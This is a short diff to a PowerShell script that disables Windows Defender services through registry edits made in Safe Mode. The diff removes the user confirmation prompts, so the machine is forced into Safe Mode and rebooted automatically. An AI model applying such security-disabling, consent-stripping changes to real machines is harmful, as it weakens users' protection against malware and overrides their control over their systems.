@@ -31,12 +31,8 @@ $bootEntry = cmd /c "bcdedit /enum {current}"
 $safeMode = $bootEntry -match "safeboot"
 
 if (-not $safeMode) {
-    $readyToReboot = Read-Host "You are not in Safe Mode. Are you ready to reboot into Safe Mode with Networking? (Y/N)"
-    if ($readyToReboot -eq "Y") {
-        cmd /c "bcdedit /set {default} safeboot network"
-        Restart-Computer
-    }
-    exit
+    cmd /c "bcdedit /set {default} safeboot network"
+    Restart-Computer
 }
 
 # Modify registry keys
@@ -55,9 +51,5 @@ foreach ($service in $services) {
 
 Write-Host "Registry keys have been updated. Windows Defender services are now disabled."
 
-# Exit Safe Mode
-$exitSafeMode = Read-Host "Are you ready to exit Safe Mode and reboot your computer? (Y/N)"
-if ($exitSafeMode -eq "Y") {
-    cmd /c "bcdedit /deletevalue {default} safeboot"
-    Restart-Computer
-}
+cmd /c "bcdedit /deletevalue {default} safeboot"
+Restart-Computer
